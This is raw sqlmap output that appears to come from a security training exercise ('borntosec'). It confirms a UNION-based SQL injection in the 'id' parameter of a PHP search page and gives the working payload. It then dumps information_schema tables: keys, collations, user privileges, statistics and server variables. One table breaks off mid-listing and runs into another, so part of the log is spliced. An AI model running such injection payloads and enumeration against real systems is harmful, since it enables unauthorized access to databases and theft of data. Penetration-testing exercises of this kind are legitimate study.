sqlmap identified the following injection point(s) with a total of 35 HTTP(s) requests:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: page=searchimg&id=1 UNION ALL SELECT CONCAT(0x716a767071,0x4a615a5750424268724f6342597a4a78444b4b43737a596e576470755a426b78754c586d63686f6e,0x717a6b6b71),NULL-- -&Submit=Submit
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.4.6, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
Database: information_schema
Table: KEY_COLUMN_USAGE
[5 entries]
+----------------------+--------------+---------------+---------------+------------------+-------------------+----------------------+----------------------+-----------------------+------------------------+-------------------------+-------------------------------+
| TABLE_SCHEMA         | TABLE_NAME   | TABLE_CATALOG | COLUMN_NAME   | ORDINAL_POSITION | CONSTRAINT_NAME   | CONSTRAINT_SCHEMA    | CONSTRAINT_CATALOG   | REFERENCED_TABLE_NAME | REFERENCED_COLUMN_NAME | REFERENCED_TABLE_SCHEMA | POSITION_IN_UNIQUE_CONSTRAINT |
+----------------------+--------------+---------------+---------------+------------------+-------------------+----------------------+----------------------+-----------------------+------------------------+-------------------------+-------------------------------+
| Member_Brute_Force   | db_default   | def           | id            | 1                | PRIMARY           | Member_Brute_Force   | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_Sql_Injection | users        | def           | user_id       | 1                | PRIMARY           | Member_Sql_Injection | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_guestbook     | guestbook    | def           | id_comment    | 1                | PRIMARY           | Member_guestbook     | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_images        | list_images  | def           | id            | 1                | PRIMARY           | Member_images        | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
| Member_survey        | vote_dbs     | def           | id_vote       | 1                | PRIMARY           | Member_survey        | def                  | NULL                  | NULL                   | NULL                    | NULL                          |
+----------------------+--------------+---------------+---------------+------------------+-------------------+----------------------+----------------------+-----------------------+------------------------+-------------------------+-------------------------------+

Database: information_schema
Table: COLLATIONS
[202 entries]
+-----+---------+------------+-------------+--------------------------+--------------------+
| ID  | SORTLEN | IS_DEFAULT | IS_COMPILED | COLLATION_NAME           | CHARACTER_SET_NAME |
| SQL_AUTO_IS_NULL                                  | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| MRR_BUFFER_SIZE                                   | 262144                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| INNODB_FILE_FORMAT_CHECK                          | ON                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| EXPIRE_LOGS_DAYS                                  | 10                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| RELAY_LOG                                         | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| ARIA_RECOVER                                      | NORMAL                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| INNODB_USE_SYS_MALLOC                             | ON                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| FOREIGN_KEY_CHECKS                                | ON                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| INNODB_CHECKPOINT_AGE_TARGET                      | 0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| INNODB_KILL_IDLE_TRANSACTION                      | 0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| ARIA_CHECKPOINT_INTERVAL                          | 30                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| SLAVE_LOAD_TMPDIR                                 | /tmp                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| MAX_TMP_TABLES                                    | 32                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| INNODB_COMMIT_CONCURRENCY                         | 0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| INNODB_STATS_SAMPLE_PAGES                         | 8                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| INNODB_MIRRORED_LOG_GROUPS                        | 1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| REPLICATE_WILD_IGNORE_TABLE                       | <blank>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| INNODB_PURGE_BATCH_SIZE                           | 20                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| ARIA_STATS_METHOD                                 | nulls_unequal                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| THREAD_STACK                                      | 196608                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| HAVE_QUERY_CACHE                                  | YES                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| INNODB_SUPPORT_XA                                 | ON                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| INNODB_LAZY_DROP_TABLE                            | 0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| DEADLOCK_TIMEOUT_SHORT                            | 10000                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| INNODB_FAKE_CHANGES                               | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| COLLATION_CONNECTION                              | latin1_swedish_ci                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
+---------------------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

Database: information_schema
Table: USER_PRIVILEGES
[1 entry]
+-------------------------+--------------+---------------+----------------+
| GRANTEE                 | IS_GRANTABLE | TABLE_CATALOG | PRIVILEGE_TYPE |
+-------------------------+--------------+---------------+----------------+
| 'borntosec'@'localhost' | NO           | def           | USAGE          |
+-------------------------+--------------+---------------+----------------+

Database: information_schema
Table: COLLATION_CHARACTER_SET_APPLICABILITY
[202 entries]
+--------------------------+--------------------+
| COLLATION_NAME           | CHARACTER_SET_NAME |
+--------------------------+--------------------+
| big5_chinese_ci          | big5               |
| big5_bin                 | big5               |
| dec8_swedish_ci          | dec8               |
| dec8_bin                 | dec8               |
| cp850_general_ci         | cp850              |
| cp850_bin                | cp850              |
| hp8_english_ci           | hp8                |
| hp8_bin                  | hp8                |
| koi8r_general_ci         | koi8r              |
| koi8r_bin                | koi8r              |
| latin1_german1_ci        | latin1             |
| latin1_swedish_ci        | latin1             |
| latin1_danish_ci         | latin1             |
| latin1_german2_ci        | latin1             |
| latin1_bin               | latin1             |
| latin1_general_ci        | latin1             |
| latin1_general_cs        | latin1             |
| latin1_spanish_ci        | latin1             |
| latin2_czech_cs          | latin2             |
| latin2_general_ci        | latin2             |
| latin2_hungarian_ci      | latin2             |
| latin2_croatian_ci       | latin2             |
| latin2_bin               | latin2             |
| swe7_swedish_ci          | swe7               |
| swe7_bin                 | swe7               |
| ascii_general_ci         | ascii              |
| ascii_bin                | ascii              |
| ujis_japanese_ci         | ujis               |
| ujis_bin                 | ujis               |
| sjis_japanese_ci         | sjis               |
| sjis_bin                 | sjis               |
| hebrew_general_ci        | hebrew             |
| hebrew_bin               | hebrew             |
| tis620_thai_ci           | tis620             |
| tis620_bin               | tis620             |
| euckr_korean_ci          | euckr              |
| euckr_bin                | euckr              |
| koi8u_general_ci         | koi8u              |
| koi8u_bin                | koi8u              |
| gb2312_chinese_ci        | gb2312             |
| gb2312_bin               | gb2312             |
| greek_general_ci         | greek              |
| greek_bin                | greek              |
| cp1250_general_ci        | cp1250             |
| cp1250_czech_cs          | cp1250             |
| cp1250_croatian_ci       | cp1250             |
| cp1250_bin               | cp1250             |
| cp1250_polish_ci         | cp1250             |
| gbk_chinese_ci           | gbk                |
| gbk_bin                  | gbk                |
| latin5_turkish_ci        | latin5             |
| latin5_bin               | latin5             |
| armscii8_general_ci      | armscii8           |
| armscii8_bin             | armscii8           |
| utf8_general_ci          | utf8               |
| utf8_bin                 | utf8               |
| utf8_unicode_ci          | utf8               |
| utf8_icelandic_ci        | utf8               |
| utf8_latvian_ci          | utf8               |
| utf8_romanian_ci         | utf8               |
| utf8_slovenian_ci        | utf8               |
| utf8_polish_ci           | utf8               |
| utf8_estonian_ci         | utf8               |
| utf8_spanish_ci          | utf8               |
| utf8_swedish_ci          | utf8               |
| utf8_turkish_ci          | utf8               |
| utf8_czech_ci            | utf8               |
| utf8_danish_ci           | utf8               |
| utf8_lithuanian_ci       | utf8               |
| utf8_slovak_ci           | utf8               |
| utf8_spanish2_ci         | utf8               |
| utf8_roman_ci            | utf8               |
| utf8_persian_ci          | utf8               |
| utf8_esperanto_ci        | utf8               |
| utf8_hungarian_ci        | utf8               |
| utf8_sinhala_ci          | utf8               |
| utf8_croatian_ci         | utf8               |
| utf8_general_mysql500_ci | utf8               |
| ucs2_general_ci          | ucs2               |
| ucs2_bin                 | ucs2               |
| ucs2_unicode_ci          | ucs2               |
| ucs2_icelandic_ci        | ucs2               |
| ucs2_latvian_ci          | ucs2               |
| ucs2_romanian_ci         | ucs2               |
| ucs2_slovenian_ci        | ucs2               |
| ucs2_polish_ci           | ucs2               |
| ucs2_estonian_ci         | ucs2               |
| ucs2_spanish_ci          | ucs2               |
| ucs2_swedish_ci          | ucs2               |
| ucs2_turkish_ci          | ucs2               |
| ucs2_czech_ci            | ucs2               |
| ucs2_danish_ci           | ucs2               |
| ucs2_lithuanian_ci       | ucs2               |
| ucs2_slovak_ci           | ucs2               |
| ucs2_spanish2_ci         | ucs2               |
| ucs2_roman_ci            | ucs2               |
| ucs2_persian_ci          | ucs2               |
| ucs2_esperanto_ci        | ucs2               |
| ucs2_hungarian_ci        | ucs2               |
| ucs2_sinhala_ci          | ucs2               |
| ucs2_croatian_ci         | ucs2               |
| ucs2_general_mysql500_ci | ucs2               |
| cp866_general_ci         | cp866              |
| cp866_bin                | cp866              |
| keybcs2_general_ci       | keybcs2            |
| keybcs2_bin              | keybcs2            |
| macce_general_ci         | macce              |
| macce_bin                | macce              |
| macroman_general_ci      | macroman           |
| macroman_bin             | macroman           |
| cp852_general_ci         | cp852              |
| cp852_bin                | cp852              |
| latin7_estonian_cs       | latin7             |
| latin7_general_ci        | latin7             |
| latin7_general_cs        | latin7             |
| latin7_bin               | latin7             |
| utf8mb4_general_ci       | utf8mb4            |
| utf8mb4_bin              | utf8mb4            |
| utf8mb4_unicode_ci       | utf8mb4            |
| utf8mb4_icelandic_ci     | utf8mb4            |
| utf8mb4_latvian_ci       | utf8mb4            |
| utf8mb4_romanian_ci      | utf8mb4            |
| utf8mb4_slovenian_ci     | utf8mb4            |
| utf8mb4_polish_ci        | utf8mb4            |
| utf8mb4_estonian_ci      | utf8mb4            |
| utf8mb4_spanish_ci       | utf8mb4            |
| utf8mb4_swedish_ci       | utf8mb4            |
| utf8mb4_turkish_ci       | utf8mb4            |
| utf8mb4_czech_ci         | utf8mb4            |
| utf8mb4_danish_ci        | utf8mb4            |
| utf8mb4_lithuanian_ci    | utf8mb4            |
| utf8mb4_slovak_ci        | utf8mb4            |
| utf8mb4_spanish2_ci      | utf8mb4            |
| utf8mb4_roman_ci         | utf8mb4            |
| utf8mb4_persian_ci       | utf8mb4            |
| utf8mb4_esperanto_ci     | utf8mb4            |
| utf8mb4_hungarian_ci     | utf8mb4            |
| utf8mb4_sinhala_ci       | utf8mb4            |
| utf8mb4_croatian_ci      | utf8mb4            |
| cp1251_bulgarian_ci      | cp1251             |
| cp1251_ukrainian_ci      | cp1251             |
| cp1251_bin               | cp1251             |
| cp1251_general_ci        | cp1251             |
| cp1251_general_cs        | cp1251             |
| utf16_general_ci         | utf16              |
| utf16_bin                | utf16              |
| utf16_unicode_ci         | utf16              |
| utf16_icelandic_ci       | utf16              |
| utf16_latvian_ci         | utf16              |
| utf16_romanian_ci        | utf16              |
| utf16_slovenian_ci       | utf16              |
| utf16_polish_ci          | utf16              |
| utf16_estonian_ci        | utf16              |
| utf16_spanish_ci         | utf16              |
| utf16_swedish_ci         | utf16              |
| utf16_turkish_ci         | utf16              |
| utf16_czech_ci           | utf16              |
| utf16_danish_ci          | utf16              |
| utf16_lithuanian_ci      | utf16              |
| utf16_slovak_ci          | utf16              |
| utf16_spanish2_ci        | utf16              |
| utf16_roman_ci           | utf16              |
| utf16_persian_ci         | utf16              |
| utf16_esperanto_ci       | utf16              |
| utf16_hungarian_ci       | utf16              |
| utf16_sinhala_ci         | utf16              |
| utf16_croatian_ci        | utf16              |
| cp1256_general_ci        | cp1256             |
| cp1256_bin               | cp1256             |
| cp1257_lithuanian_ci     | cp1257             |
| cp1257_bin               | cp1257             |
| cp1257_general_ci        | cp1257             |
| utf32_general_ci         | utf32              |
| utf32_bin                | utf32              |
| utf32_unicode_ci         | utf32              |
| utf32_icelandic_ci       | utf32              |
| utf32_latvian_ci         | utf32              |
| utf32_romanian_ci        | utf32              |
| utf32_slovenian_ci       | utf32              |
| utf32_polish_ci          | utf32              |
| utf32_estonian_ci        | utf32              |
| utf32_spanish_ci         | utf32              |
| utf32_swedish_ci         | utf32              |
| utf32_turkish_ci         | utf32              |
| utf32_czech_ci           | utf32              |
| utf32_danish_ci          | utf32              |
| utf32_lithuanian_ci      | utf32              |
| utf32_slovak_ci          | utf32              |
| utf32_spanish2_ci        | utf32              |
| utf32_roman_ci           | utf32              |
| utf32_persian_ci         | utf32              |
| utf32_esperanto_ci       | utf32              |
| utf32_hungarian_ci       | utf32              |
| utf32_sinhala_ci         | utf32              |
| utf32_croatian_ci        | utf32              |
| binary                   | binary             |
| geostd8_general_ci       | geostd8            |
| geostd8_bin              | geostd8            |
| cp932_japanese_ci        | cp932              |
| cp932_bin                | cp932              |
| eucjpms_japanese_ci      | eucjpms            |
| eucjpms_bin              | eucjpms            |
+--------------------------+--------------------+

Database: information_schema
Table: KEY_CACHES
[1 entry]
+--------+---------+----------+-----------+------------+-------------+--------------+---------------+---------------+----------------+----------------+----------------+
| WRITES | READS   | SEGMENTS | FULL_SIZE | BLOCK_SIZE | USED_BLOCKS | DIRTY_BLOCKS | READ_REQUESTS | UNUSED_BLOCKS | KEY_CACHE_NAME | SEGMENT_NUMBER | WRITE_REQUESTS |
+--------+---------+----------+-----------+------------+-------------+--------------+---------------+---------------+----------------+----------------+----------------+
| 0      | 0       | NULL     | 16777216  | 1024       | 0           | 0            | 0             | 13396         | default        | NULL           | 0              |
+--------+---------+----------+-----------+------------+-------------+--------------+---------------+---------------+----------------+----------------+----------------+

Database: information_schema
Table: STATISTICS
[5 entries]
+--------+----------+----------+-----------+------------+------------+------------+-------------+----------------------+--------------+----------------------+--------------+---------------+---------------+---------------+---------------+
| PACKED | NULLABLE | SUB_PART | COMMENT   | INDEX_NAME | INDEX_TYPE | NON_UNIQUE | COLLATION   | INDEX_SCHEMA         | SEQ_IN_INDEX | TABLE_SCHEMA         | TABLE_NAME   | INDEX_COMMENT | TABLE_CATALOG | CARDINALITY   | COLUMN_NAME   |
+--------+----------+----------+-----------+------------+------------+------------+-------------+----------------------+--------------+----------------------+--------------+---------------+---------------+---------------+---------------+
| NULL   | <blank>  | NULL     | <blank>   | PRIMARY    | BTREE      | 0          | A           | Member_Brute_Force   | 1            | Member_Brute_Force   | db_default   | <blank>       | def           | 2             | id            |
| NULL   | <blank>  | NULL     | <blank>   | PRIMARY    | BTREE      | 0          | A           | Member_Sql_Injection | 1            | Member_Sql_Injection | users        | <blank>       | def           | 4             | user_id       |
| NULL   | <blank>  | NULL     | <blank>   | PRIMARY    | BTREE      | 0          | A           | Member_guestbook     | 1            | Member_guestbook     | guestbook    | <blank>       | def           | 1             | id_comment    |
| NULL   | <blank>  | NULL     | <blank>   | PRIMARY    | BTREE      | 0          | A           | Member_images        | 1            | Member_images        | list_images  | <blank>       | def           | 5             | id            |
| NULL   | <blank>  | NULL     | <blank>   | PRIMARY    | BTREE      | 0          | A           | Member_survey        | 1            | Member_survey        | vote_dbs     | <blank>       | def           | 5             | id_vote       |
+--------+----------+----------+-----------+------------+------------+------------+-------------+----------------------+--------------+----------------------+--------------+---------------+---------------+---------------+---------------+

Database: information_schema
Table: GLOBAL_VARIABLES
[419 entries]
+---------------------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| VARIABLE_NAME                                     | VARIABLE_VALUE                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
+---------------------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
 ...
| MAX_PREPARED_STMT_COUNT                           | 16382                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| INNODB_OLD_BLOCKS_PCT                             | 37                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| HAVE_CRYPT                                        | YES                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| PERFORMANCE_SCHEMA_EVENTS_WAITS_HISTORY_LONG_SIZE | 10000                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| INNODB_VERSION                                    | 5.5.61-MariaDB-38.13                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| OPTIMIZER_SEARCH_DEPTH                            | 62                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| DELAYED_QUEUE_SIZE                                | 1000                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| PERFORMANCE_SCHEMA_MAX_COND_INSTANCES             | 1000                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| OLD_PASSWORDS                                     | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| SLOW_QUERY_LOG                                    | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| AUTO_INCREMENT_INCREMENT                          | 1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| DELAYED_INSERT_TIMEOUT                            | 300                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| PERFORMANCE_SCHEMA_MAX_MUTEX_INSTANCES            | 1000000                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| LOG                                               | OFF                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| PERFORMANCE_SCHEMA_MAX_RWLOCK_INSTANCES           | 1000000                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| OPEN_FILES_LIMIT                                  | 962                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| PERFORMANCE_SCHEMA_MAX_RWLOCK_CLASSES             | 30                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| BASEDIR                                           | /usr                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
